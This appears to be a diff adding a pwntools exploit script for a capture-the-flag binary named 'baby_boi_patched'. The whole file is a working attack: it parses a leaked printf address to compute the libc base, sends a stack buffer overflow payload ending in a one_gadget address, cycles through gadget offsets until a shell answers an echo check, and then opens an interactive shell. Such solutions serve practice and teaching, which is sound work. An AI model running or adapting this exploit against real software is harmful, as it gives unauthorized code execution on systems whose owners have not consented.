@@ -1,0 +1,29 @@
+from pwn import *
+
+libc = ELF("libc-2.27.so")
+
+# $ one_gadget libc-2.27.so
+oneshot = [0x4f2be, 0x4f2c5, 0x4f322, 0x10a38c]
+
+for i in range(len(oneshot)):
+    p = process("./baby_boi_patched")
+    
+    p.recvuntil("am: ")
+    libc_base = int(p.recvline(), 16) - libc.symbols['printf']
+    
+    payload = b"A" * 0x20 + b"B" * 8 + p64(libc_base + oneshot[i])
+    p.sendline(payload)
+    
+    try:
+        p.sendline(b"echo vani5hing")
+        p.recvuntil(b"vani5hing")
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+
+
+p.interactive()
+    
